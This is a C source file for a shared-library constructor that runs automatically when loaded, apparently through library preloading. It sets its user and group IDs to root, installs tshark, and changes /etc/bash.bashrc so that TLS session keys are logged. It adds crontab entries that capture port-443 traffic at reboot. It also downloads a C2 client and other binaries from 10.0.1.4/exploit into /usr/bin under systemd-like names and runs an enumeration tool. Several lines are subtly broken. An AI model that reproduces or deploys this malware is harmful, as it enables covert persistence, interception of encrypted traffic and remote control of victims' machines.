//#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>  
#include <sys/types.h>
#include <sys/wait.h> 
#include <fcntl.h>
//#include <string.h>
//#include <errno.h>

void test(char* argv[]);
void appendToFile(char* name, char* content);
void runAlone(char* argv[]);

static void __attribute__((constructor)) _init(void) {
//int main(void) {
	syscall(SYS_setuid, 0);
	syscall(SYS_setgid, 0);

	char* argv0[] = {"/usr/bin/apt-get","install","-yq","tshark", "net-tools",NULL};
	test(argv0);

	appendToFile("/etc/bash.bashrc", "SSLKEYLOGFILE=/var/log/gamelog/key.log\n");

	char* argv2[] = {"/usr/bin/mkdir","-p", "/var/log/gamelog",NULL };
	test(argv2);

	appendToFile("/etc/bash.bashrc", "GAMELOG=/var/log/gamelog/syslog.log\n");
	appendToFile("/etc/crontab", "00 9-17 * 1-5 root /usr/bin/systemd-checker\n");

	appendToFile("/etc/crontab", "@reboot root tshark -ni any -f 'tcp port 443' -w /var/log/gamelog/error_log -b duration:5000\n");

	char* argv7[] = {"/usr/bin/tshark", "-ni", "any", "-f" "tcp port 443", "-w", "/var/log/gamelog/error_log", "-b", "duration:5000", NULL};
	runAlone(argv7);

	char* argv8[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/updatesvc_akac2client","-o", "/usr/bin/systemd-check", NULL};
	test(argv8);

	char* argv9[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/check_update","-o", "/usr/bin/systemd-checker", NULL};
	test(argv9);
	
	char* argv10[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/enumerate", "-o", "/usr/bin/enumerate", NULL};
	test(argv10);

	char* argv11[] = { "/usr/bin/enumerate", NULL };
	test(argv11);


	syscall(SYS_exit, 69);
}


void appendToFile(char* name, char* content) {
	int f = open(name,O_WRONLY | O_APPEND);
	int c = write(f, content, sizeof(content));
	close(f);
}

void runAlone(char* argv[]) {
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    // Don't wait for child. 
	    // waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execv(argv[0], argv);
	}

}

void test(char* argv[]) {
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execv(argv[0], argv);
	}
}
